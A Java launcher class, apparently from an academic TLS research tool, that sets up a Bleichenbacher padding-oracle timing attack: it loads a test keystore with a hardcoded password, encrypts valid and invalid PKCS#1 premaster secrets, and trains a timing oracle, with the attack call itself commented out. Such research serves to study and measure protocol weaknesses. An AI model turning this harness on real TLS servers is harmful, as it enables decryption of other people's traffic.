package de.rub.nds.ssl.attacker;

import de.rub.nds.ssl.attacker.bleichenbacher.Bleichenbacher;
import de.rub.nds.ssl.attacker.bleichenbacher.OracleType;
import de.rub.nds.ssl.attacker.bleichenbacher.oracles.CommandLineTimingOracle;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.Security;
import java.security.cert.CertificateException;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import javax.crypto.Cipher;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

/**
 * Measurement launcher.
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * Jun 28, 2013
 */
public final class Launcher {

    /**
     * VALID PKCS with valid PMS - 1024bit.
     */
    private static final byte[] PLAIN_VALID_PKCS = new byte[]{
        (byte) 0x00, (byte) 0x02,
        (byte) 0x01, (byte) 0x01, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
        (byte) 0xba, (byte) 0xbe,
        (byte) 0x00,
        (byte) 0x03, (byte) 0x01,
        (byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04, (byte) 0x05,
        (byte) 0x06, (byte) 0x07, (byte) 0x08, (byte) 0x09, (byte) 0x0a,
        (byte) 0x0b, (byte) 0x0c, (byte) 0x0d, (byte) 0x0e, (byte) 0x0f,
        (byte) 0x10, (byte) 0x11, (byte) 0x12, (byte) 0x13, (byte) 0x14,
        (byte) 0x15, (byte) 0x16, (byte) 0x17, (byte) 0x18, (byte) 0x19,
        (byte) 0x1a, (byte) 0x1b, (byte) 0x1c, (byte) 0x1d, (byte) 0x1e,
        (byte) 0x1f, (byte) 0x20, (byte) 0x21, (byte) 0x22, (byte) 0x23,
        (byte) 0x24, (byte) 0x25, (byte) 0x26, (byte) 0x27, (byte) 0x28,
        (byte) 0x29, (byte) 0x2a, (byte) 0x2b, (byte) 0x2c, (byte) 0x2d,
        (byte) 0x2e
    };

    /**
     * Static only ;-)
     */
    private Launcher() {
        
    }
    
    /**
     * Load a key store.
     * @param keyStorePath Path to the key store.
     * @param keyStorePassword Password for key store.
     * @return Pre-loaded key store.
     * @throws KeyStoreException
     * @throws IOException
     * @throws NoSuchAlgorithmException
     * @throws CertificateException 
     */
    private static KeyStore loadKeyStore(final String keyStorePath,
            final char[] keyStorePassword) throws KeyStoreException, 
            IOException, NoSuchAlgorithmException, CertificateException {
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(Launcher.class.getResourceAsStream(keyStorePath), 
                keyStorePassword);

        return ks;
    }

    /**
     * Main entry point.
     *
     * @param args Arguments will be ignored
     * @throws Exception
     */
    public static void main(final String[] args) throws Exception {
        // just for testing
//        CommandLineWorkflowExecutor executor = 
//                new CommandLineWorkflowExecutor(COMMAND);
//        executor.executeClientWithPMS("IamBatman".getBytes());

        // pre setup
        Security.addProvider(new BouncyCastleProvider());
        
        String keyName = "1";
        char[] keyPassword = "password".toCharArray();
        KeyStore keyStore = loadKeyStore("matrix-key.jks", keyPassword);

        RSAPrivateKey privateKey =
                (RSAPrivateKey) keyStore.getKey(keyName, keyPassword);
        RSAPublicKey publicKey =
                (RSAPublicKey) keyStore.getCertificate(keyName).getPublicKey();

        Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);

        // encrypt valid PMS
        byte[] encValidPMS = cipher.doFinal(PLAIN_VALID_PKCS);

        //  encrypt invalid PMS
        byte[] plainInvalidPKCS = PLAIN_VALID_PKCS.clone();
        plainInvalidPKCS[1] = 0x3;
        byte[] encInvalidPMS = cipher.doFinal(plainInvalidPKCS);

        // prepare the timing oracle
        CommandLineTimingOracle oracle = new CommandLineTimingOracle(
                OracleType.TTT, publicKey, privateKey);

        // train oracle
        oracle.trainOracle(encValidPMS, encInvalidPMS);

        // launch the attack
        Bleichenbacher attack = new Bleichenbacher(encValidPMS, oracle, true);
//        attack.attack();
    }
}
